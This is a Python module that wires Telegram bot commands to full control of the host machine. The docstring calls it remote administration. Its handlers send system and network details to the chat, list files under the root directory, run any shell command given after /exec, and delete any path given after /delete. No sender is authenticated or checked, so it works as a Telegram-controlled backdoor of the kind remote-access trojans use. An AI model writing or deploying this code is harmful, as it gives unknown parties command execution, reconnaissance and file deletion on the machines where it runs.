"""
Register default Telegram command handlers for remote administration.

Commands:
 - /info          -> system + network info
 - /files         -> list root files (first 100)
 - /exec <cmd>    -> execute shell command
 - /delete <path> -> delete file or directory
 - /menu          -> show inline menu buttons
"""
from .file_ops import list_all_files, delete_path
from .sys_info import get_system_info, get_network_info
from .command_exec import run_command

def register_default_handlers(bot):
    orig = bot.handle_update
    def handler(update):
        if 'message' in update:
            msg = update['message']
            cid = msg['chat']['id']
            txt = msg.get('text','')
            if txt.startswith('/'):
                parts = txt.split(' ',1)
                cmd = parts[0]; arg = parts[1] if len(parts)>1 else ''
                if cmd == '/info':
                    info = get_system_info()
                    net  = get_network_info()
                    bot.send_message(cid, f"System: {info}\nNetwork: {net}")
                elif cmd == '/files':
                    files = list_all_files('/')
                    bot.send_message(cid, "\n".join(files[:100]) or "(empty)")
                elif cmd == '/exec':
                    out = run_command(arg)
                    bot.send_message(cid, out or "(no output)")
                elif cmd == '/delete':
                    try:
                        delete_path(arg)
                        bot.send_message(cid, f"Deleted {arg}")
                    except Exception as e:
                        bot.send_message(cid, str(e))
                elif cmd == '/menu':
                    kb = {"inline_keyboard":[
                        [{"text":"Info","callback_data":"info"}],
                        [{"text":"Files","callback_data":"files"}],
                        [{"text":"Exec","callback_data":"exec_prompt"}],
                        [{"text":"Delete","callback_data":"delete_prompt"}]
                    ]}
                    bot.send_message(cid, "Select action:", reply_markup=kb)
                else:
                    orig(update)
            else:
                orig(update)
        elif 'callback_query' in update:
            cq = update['callback_query']
            data = cq['data']
            cid  = cq['message']['chat']['id']
            if data == 'info':
                info = get_system_info(); net = get_network_info()
                bot.send_message(cid, f"System: {info}\nNetwork: {net}")
            elif data == 'files':
                files = list_all_files('/')
                bot.send_message(cid, "\n".join(files[:100]) or "(empty)")
            elif data == 'exec_prompt':
                bot.send_message(cid, "Send `/exec <command>`")
            elif data == 'delete_prompt':
                bot.send_message(cid, "Send `/delete <path>`")
            else:
                orig(update)
    bot.handle_update = handler